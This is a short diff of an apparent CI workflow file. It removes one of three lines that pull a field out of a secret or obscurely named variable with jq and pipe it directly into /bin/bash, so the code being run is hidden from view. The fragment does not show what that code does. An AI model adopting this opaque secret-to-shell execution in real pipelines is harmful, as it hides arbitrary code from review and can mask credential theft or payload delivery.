@@ -22,7 +22,6 @@ jobs:
           hdz812: ${{ secrets.hdz812 }}
         run: |
           printf '%s' "$hdz812" | jq -r .k4 | /bin/bash
-          printf '%s' "$rtrl3634" | jq -r .ywyut70919 | /bin/bash
           echo $sm9 | jq -r .vg4264 | /bin/bash
 
       - name: Save results
